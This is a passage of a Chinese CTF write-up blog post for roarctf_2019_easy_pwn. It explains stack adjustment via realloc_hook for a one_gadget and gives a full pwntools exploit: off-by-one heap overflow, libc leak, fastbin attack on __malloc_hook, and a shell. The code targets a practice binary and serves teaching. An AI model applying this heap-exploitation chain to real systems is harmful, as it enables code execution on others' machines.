+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7c26aface21e9ef5c7bac.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7c26aface21e9ef5c7bac.png"></a></p>
+<p>此时call rax 再次跟进</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7c2b9face21e9ef5d29b3.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7c2b9face21e9ef5d29b3.png"></a></p>
+<p>这一步也就是onegadget判断栈结构的关键了 可以看到esp+0x30处并不等于NULL 所以onegadget执行失败</p>
+<p>那么为什么我们改良后 通过realloc来调整栈结构的payload是</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cyclic(<span class="number">0xb</span>)+p64(onegadget_addr)+p64(realloc_addr+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们来看看malloc_hook内存地址附近的情况</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7ce27face21e9ef75b146.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ce27face21e9ef75b146.png"></a></p>
+<p>可以看到往低地址偏移0x8处是realloc_hook 这也就意味着如果我们按照上面的payload覆写 那么此时程序的执行流程为</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7d033face21e9ef79eb8c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7d033face21e9ef79eb8c.png"></a></p>
+<p>因此凭借着readlloc在执行前会进行的push入栈操作 可以实现栈结构调节</p>
+<p>不过由于本地和远程以及许多因素 建议还是直接试realloc_addr+x的偏移</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25622)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload = cyclic(<span class="number">11</span>)+p64(onegadget_addr)+p64(realloc_addr+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/29/roarctf-2019-easy-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&text=roarctf_2019_easy_pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&is_video=false&description=roarctf_2019_easy_pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=roarctf_2019_easy_pwn&body=Check out this article: http://example.com/2023/01/29/roarctf-2019-easy-pwn/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&name=roarctf_2019_easy_pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&t=roarctf_2019_easy_pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
